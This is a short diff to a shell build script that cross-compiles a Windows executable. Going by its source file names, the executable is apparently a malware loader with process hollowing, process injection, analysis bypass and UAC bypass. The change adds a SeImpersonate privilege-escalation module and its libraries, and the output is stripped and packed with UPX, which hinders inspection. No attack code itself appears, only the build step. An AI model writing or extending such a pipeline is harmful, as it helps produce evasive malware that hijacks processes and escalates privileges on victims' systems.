@@ -26,8 +26,8 @@ CC="x86_64-w64-mingw32-g++"
 [[ "$ARCH" == "x86" ]] && CC="i686-w64-mingw32-g++"
 
 $CC -O2 -s -static -static-libgcc -static-libstdc++ \
-  loader.cpp easCipher42.cpp crypto_funcs.cpp process_hollower.cpp process_injection.cpp bypass_analysis.cpp uac_bypass.cpp \
-  -lbcrypt -lntdll -lole32 -lwinhttp -o "$OUTPUT_EXE"
+  loader.cpp easCipher42.cpp crypto_funcs.cpp process_hollower.cpp process_injection.cpp bypass_analysis.cpp uac_bypass.cpp seimpersonate.cpp \
+  -lbcrypt -lntdll -lole32 -lwinhttp -lrpcrt4 -luserenv -o "$OUTPUT_EXE"
 
 strip "$OUTPUT_EXE" 2>/dev/null || true
 upx --best "$OUTPUT_EXE" 2>/dev/null || true
